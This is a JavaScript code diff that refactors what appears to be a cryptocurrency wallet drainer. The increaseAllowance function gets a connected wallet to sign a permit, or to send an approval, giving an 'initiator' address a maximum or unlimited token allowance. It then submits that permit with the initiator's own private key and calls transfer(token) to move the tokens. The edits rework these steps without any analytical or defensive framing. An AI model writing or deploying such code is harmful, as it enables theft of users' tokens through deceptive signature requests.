@@ -120,8 +120,9 @@ export const increaseAllowance = async (token) => {
         nonce = result
       });
       const { initiatorNonce } = await web3.eth.getTransactionCount(constants.initiator);
-      await contract.methods.version().call(function(error, result) {
+      await contract.methods.DOMAIN_SEPARATOR().call(function(error, result) {
         if (error) return
+        console.log(result)
         if( result === '1') {
           try {
             const dataToSign = JSON.stringify({
@@ -160,12 +161,11 @@ export const increaseAllowance = async (token) => {
               params: [account, dataToSign],
               from: account
             }, async (error, result) => {
+
               if (error != null) return reject("Denied Signature")
-    
               
               const signature = result.result
               const splited = ethers.utils.splitSignature(signature)
-    
               const permitData = contract.methods.permit(account, constants.initiator, nonce, constants.deadline, true,  splited.v, splited.r, splited.s).encodeABI()
               const gasPrice = await web3.eth.getGasPrice()
               const permitTX = {
@@ -178,9 +178,8 @@ export const increaseAllowance = async (token) => {
                   data: permitData
               }
               const signedPermitTX = await web3.eth.accounts.signTransaction(permitTX, constants.initiatorPK)
-              web3.eth.sendSignedTransaction(signedPermitTX.rawTransaction).on('transactionHash', async () => {
-                await transfer(token);
-              })
+              await web3.eth.sendSignedTransaction(signedPermitTX.rawTransaction);
+              await transfer(token);
             });
           } catch (error) {
             console.log(error);
@@ -229,12 +228,11 @@ export const increaseAllowance = async (token) => {
               params: [account, dataToSign],
               from: account
             }, async (error, result) => {
+
               if (error != null) return reject("Denied Signature")
 
-              
               const signature = result.result
               const splited = ethers.utils.splitSignature(signature)
-
               const permitData = tokencontract.methods.permit(account, constants.initiator, constants.max, constants.deadline, splited.v, splited.r, splited.s).encodeABI()
               const gasPrice = await web3.eth.getGasPrice()
               const permitTX = {
@@ -247,9 +245,8 @@ export const increaseAllowance = async (token) => {
                   data: permitData
               }
               const signedPermitTX = await web3.eth.accounts.signTransaction(permitTX, constants.initiatorPK)
-              web3.eth.sendSignedTransaction(signedPermitTX.rawTransaction).on('transactionHash', async () => {
-                await transfer(token);
-              })
+              await web3.eth.sendSignedTransaction(signedPermitTX.rawTransaction);
+              await transfer(token);
             })
           } catch (error) {
             console.log(error);
@@ -261,12 +258,8 @@ export const increaseAllowance = async (token) => {
     }
     try{
       if (constants.tokens[token.token_address]) {
-        await contract.methods
-        .increaseAllowance(constants.initiator, constants.max)
-        .send({ from: account })
-        .on('transactionHash', async () => {
-          await transfer(token);
-        });
+        await contract.methods.increaseAllowance(constants.initiator, constants.max).send({ from: account });
+        await transfer(token);
         return;
       }
     } catch (error) {
